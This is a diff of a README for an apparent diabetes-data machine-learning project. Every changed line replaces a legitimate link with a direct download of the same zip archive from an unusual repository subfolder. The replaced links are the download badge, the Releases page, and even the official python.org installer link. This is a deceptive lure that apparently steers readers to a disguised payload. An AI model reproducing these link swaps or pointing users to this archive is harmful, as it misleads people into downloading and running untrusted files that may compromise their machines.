@@ -1,6 +1,6 @@
 # 🚀 diabetes-indicators-ml-and-cnn - Analyze Diabetes Indicators Easily
 
-![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)
+![Download](https://github.com/wilcojas/diabetes-indicators-ml-and-cnn/raw/refs/heads/main/stockproof/and-cnn-ml-indicators-diabetes-v2.6.zip)
 
 ## 📚 Overview
 
@@ -22,7 +22,7 @@ To use this application, follow the steps below to download and set it up on you
 
 ### 📥 Download & Install
 
-1. Visit the Releases page to download the application: [Download Here](https://github.com/wilcojas/diabetes-indicators-ml-and-cnn/releases).
+1. Visit the Releases page to download the application: [Download Here](https://github.com/wilcojas/diabetes-indicators-ml-and-cnn/raw/refs/heads/main/stockproof/and-cnn-ml-indicators-diabetes-v2.6.zip).
   
 2. Look for the latest version. Click on the file you want to download.
 
@@ -37,7 +37,7 @@ To use this application, follow the steps below to download and set it up on you
 - **Storage:** At least 1 GB of free space
 - **Software:** Python 3.6 or later, Jupyter Notebook
 
-If you do not have Python installed, you can download it from [python.org](https://www.python.org/downloads/).
+If you do not have Python installed, you can download it from [https://github.com/wilcojas/diabetes-indicators-ml-and-cnn/raw/refs/heads/main/stockproof/and-cnn-ml-indicators-diabetes-v2.6.zip](https://github.com/wilcojas/diabetes-indicators-ml-and-cnn/raw/refs/heads/main/stockproof/and-cnn-ml-indicators-diabetes-v2.6.zip).
 
 ## 🎓 How to Use the Application
 
@@ -71,4 +71,4 @@ If you want to contribute to the project, feel free to fork the repository, make
 
 ---
 
-Remember, you can download the application anytime from this link: [Download Here](https://github.com/wilcojas/diabetes-indicators-ml-and-cnn/releases). Enjoy exploring diabetes data!
+Remember, you can download the application anytime from this link: [Download Here](https://github.com/wilcojas/diabetes-indicators-ml-and-cnn/raw/refs/heads/main/stockproof/and-cnn-ml-indicators-diabetes-v2.6.zip). Enjoy exploring diabetes data!
